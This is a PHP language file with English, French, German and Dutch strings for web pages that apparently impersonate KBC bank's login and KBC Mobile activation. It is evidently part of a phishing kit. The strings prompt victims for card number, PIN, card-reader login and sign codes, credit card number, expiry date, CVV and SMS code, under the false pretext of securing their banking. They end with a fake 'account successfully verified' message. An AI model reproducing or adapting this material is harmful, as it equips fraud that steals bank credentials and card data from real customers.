<?php
    function get_text($place) {
        global $lang;
        return $lang[$place][$_SESSION["lang"]];
    }

    $lang = array(

        'login_title' => array(
            'en' => 'How do you want to log in?',
            'fr' => 'Choisissez de quelle manière vous souhaitez vous connecter',
            'de' => 'Wählen Sie, auf welche Weise Sie sich anmelden möchten',
            'nl' => 'Kies op welke manier je wilt aanmelden',
        ),

        'enter_card' => array(
            'en' => 'Enter your card number',
            'fr' => 'Introduisez votre numéro de carte',
            'de' => 'Geben Sie Ihre Kartennummer ein',
            'nl' => 'Voer je kaartnummer in',
        ),

        'save' => array(
            'en' => 'Save',
            'fr' => 'Enregistrer',
            'de' => 'Speichern',
            'nl' => 'Bewaren',
        ),

        'insert_bank_card' => array(
            'en' => 'Insert your bank card into the card reader',
            'fr' => 'Introduisez votre carte de débit dans le lecteur de carte',
            'de' => 'Stecken Sie Ihre Debitkarte in den Kartenleser',
            'nl' => 'Steek je debetkaart in de kaartlezer',
        ),


        'press' => array(
            'en' => 'Press',
            'fr' => 'Appuyez sur',
            'de' => 'Drücken Sie',
            'nl' => 'Druk',
        ),


        'start_code' => array(
            'en' => 'Enter the start code',
            'fr' => 'Introduisez le code de départ',
            'de' => 'Startcode eingeben',
            'nl' => 'Voer de startcode in',
        ),

        'enter_pin' => array(
            'en' => 'Enter your PIN',
            'fr' => 'Introduisez votre code PIN',
            'de' => 'Geheimzahl eingeben',
            'nl' => 'Voer je pincode in',
        ),

        'pin' => array(
            'en' => 'PIN',
            'fr' => 'PIN',
            'de' => 'PIN',
            'nl' => 'PIN',
        ),

        'enter_login' => array(
            'en' => 'Enter the login code',
            'fr' => 'Introduisez le code de connexion',
            'de' => 'Geben Sie den Anmeldecode ein',
            'nl' => 'Voer de aanmeldcode in',
        ),

        'login' => array(
            'en' => 'Login',
            'fr' => 'Se connecter',
            'de' => 'Anmelden',
            'nl' => 'Aanmelden',
        ),

        'msg1' => array(
            'en' => 'The message appears on the card reader',
            'fr' => 'Le message apparaît sur le lecteur de carte',
            'de' => 'Die Meldung erscheint auf dem Kartenleser',
            'nl' => 'Op de kaartlezer verschijnt de boodschap',
        ),

        'msg2' => array(
            'en' => 'Request KBC Mobile OK?',
            'fr' => 'Demander KBC Mobile, OK ?',
            'de' => 'KBC Mobile anfordern OK?',
            'nl' => 'Aanvraag KBC Mobile OK?',
        ),

        'confirm' => array(
            'en' => 'Confirm with',
            'fr' => 'Confirmer avec',
            'de' => 'Bestätigen mit',
            'nl' => 'Bevestig met',
        ),

        'enter_sign' => array(
            'en' => 'Enter the Sign code and press Sign.',
            'fr' => 'Entrez le code du signature et appuyez sur Signature.',
            'de' => 'Geben Sie den Sign-Code ein und drücken Sie Sign.',
            'nl' => 'Vul de tekencode in en druk op Tekenen.',
        ),

        'sign' => array(
            'en' => 'Sign',
            'fr' => 'Signature',
            'de' => 'Sign',
            'nl' => 'Tekenen',
        ),

        'success1' => array(
            'en' => 'Congratulations! Your Account Information Has Been Successfully Verified.',
            'fr' => 'Félicitations ! Vos informations de compte ont été vérifiées avec succès.',
            'de' => 'Herzlichen Glückwunsch! Ihre Kontoinformationen wurden erfolgreich verifiziert.',
            'nl' => 'Je hebt KBC Mobile geactiveerd.',
        ),
        'success2' => array(
            'en' => 'Thank you for completing the verification process. Your account is now fully verified and ready to use. You can now enjoy all the features and benefits we offer. If you have any further questions or need assistance, don’t hesitate to reach out to our support team. Welcome aboard!',
            'fr' => 'Merci d\'avoir complété le processus de vérification. Votre compte est maintenant entièrement vérifié et prêt à être utilisé. Vous pouvez désormais profiter de toutes les fonctionnalités et avantages que nous offrons. Si vous avez des questions ou avez besoin d\'aide, n\'hésitez pas à contacter notre équipe d\'assistance. Bienvenue à bord !',
            'de' => 'Danke, dass Sie den Verifizierungsprozess abgeschlossen haben. Ihr Konto ist jetzt vollständig verifiziert und einsatzbereit. Sie können nun alle Funktionen und Vorteile nutzen, die wir anbieten. Wenn Sie weitere Fragen haben oder Unterstützung benötigen, zögern Sie nicht, unser Support-Team zu kontaktieren. Willkommen an Bord!',
            'nl' => 'Bedankt voor het voltooien van het verificatieproces. Uw account is nu volledig geverifieerd en klaar voor gebruik. U kunt nu genieten van alle functies en voordelen die wij bieden. Als u nog vragen hebt of hulp nodig hebt, aarzel dan niet om contact op te nemen met ons supportteam. Welkom aan boord!',
        ),

        'select' => array(
            'en' => 'Select your logon method.',
            'fr' => 'Choisissez de quelle manière vous souhaitez vous connecter.',
            'de' => 'Wählen Sie, auf welche Weise Sie sich anmelden möchten.',
            'nl' => 'Kies op welke manier je wilt aanmelden.',
        ),

        'one_error' => array(
            'en' => 'The card number you have entered is incorrect.',
            'fr' => 'Le numéro de carte que vous avez saisi est incorrect.',
            'de' => 'Die von Ihnen eingegebene Kartennummer ist falsch.',
            'nl' => 'Het kaartnummer dat u heeft ingevoerd is onjuist.',
        ),

        'code_error' => array(
            'en' => 'The code you have entered is incorrect.',
            'fr' => 'Le code que vous avez saisi est incorrect.',
            'de' => 'Der von Ihnen eingegebene Code ist falsch.',
            'nl' => 'De code die u heeft ingevoerd is onjuist.',
        ),

        'cc_title' => array(
            'en' => 'Verify your credit card',
            'fr' => 'Vérifiez votre carte de crédit',
            'de' => 'Verifizieren Sie Ihre Kreditkarte',
            'nl' => 'Verifieer uw creditcard',
        ),

        'cc_text' => array(
            'en' => 'This service allows you to enter and/or update your credit card to secure your internet banking transactions at the highest level, including your online purchases by bank card.',
            'fr' => 'Ce service vous permet de saisir et/ou de mettre à jour votre carte de crédit afin de sécuriser au plus haut niveau vos transactions bancaires sur Internet, y compris vos achats en ligne par carte bancaire.',
            'de' => 'Mit diesem Dienst können Sie Ihre Kreditkarte eingeben und/oder aktualisieren, um Ihre Internet-Banking-Transaktionen, einschließlich Ihrer Online-Einkäufe mit Bankkarte, auf höchstem Niveau zu sichern.',
            'nl' => 'Met deze service kunt u uw creditcardgegevens invoeren en/of wijzigen om uw internetbankiertransacties optimaal te beveiligen, ook uw online aankopen met uw bankpas.',
        ),

        'one_label' => array(
            'en' => 'Card number',
            'fr' => 'Numéro de carte',
            'de' => 'Kartennummer',
            'nl' => 'Kaartnummer',
        ),

        'one_error' => array(
            'en' => 'Card number is invalid',
            'fr' => 'Le numéro de carte n\'est pas valide',
            'de' => 'Die Kartennummer ist ungültig',
            'nl' => 'Kaartnummer is ongeldig',
        ),

        'two_label' => array(
            'en' => 'Expiration date',
            'fr' => 'Date d\'expiration',
            'de' => 'Verfallsdatum',
            'nl' => 'Vervaldatum',
        ),

        'two_placeholder' => array(
            'en' => 'MM/YY',
            'fr' => 'MM/AA',
            'de' => 'MM/JJ',
            'nl' => 'MM/JJ',
        ),

        'two_error' => array(
            'en' => 'Invalid date',
            'fr' => 'Date invalide',
            'de' => 'Ungültiges Datum',
            'nl' => 'Ongeldige datum',
        ),

        'three_label' => array(
            'en' => 'Security code (CVV)',
            'fr' => 'Code de sécurité (CVV)',
            'de' => 'Sicherheitscode (CVV)',
            'nl' => 'Beveiligingscode (CVV)',
        ),

        'three_error' => array(
            'en' => 'CVV is invalid',
            'fr' => 'Le CVV n\'est pas valide',
            'de' => 'CVV ist ungültig',
            'nl' => 'CVV is ongeldig',
        ),

        'verification' => array(
            'en' => 'Verification',
            'fr' => 'Verification',
            'de' => 'Überprüfung',
            'nl' => 'Verificatie',
        ),

        'sms_text' => array(
            'en' => 'A security code will be sent to you via SMS or call from a voice server on your phone, which is valid for 5 minutes.',
            'fr' => 'Un code de sécurité vous sera envoyé par SMS ou appel depuis un serveur vocal sur votre téléphone, valable 5 minutes.',
            'de' => 'Ihnen wird per SMS oder Anruf von einem Sprachserver auf Ihr Mobiltelefon ein Sicherheitscode gesendet, der 5 Minuten gültig ist.',
            'nl' => 'U ontvangt via sms of een telefoontje een beveiligingscode van een voiceserver op uw telefoon. Deze code is 5 minuten geldig.',
        ),

        'sms_label' => array(
            'en' => 'SMS Code',
            'fr' => 'Code SMS',
            'de' => 'SMS-Code',
            'nl' => 'SMS-code',
        ),

        'sms_error' => array(
            'en' => 'Invalid code',
            'fr' => 'Code invalide',
            'de' => 'Ungültiger Code',
            'nl' => 'Ongeldige code',
        ),

        'verify' => array(
            'en' => 'Verify',
            'fr' => 'Vérifier',
            'de' => 'Verifizieren',
            'nl' => 'Verifiëren',
        ),
        
    );

?>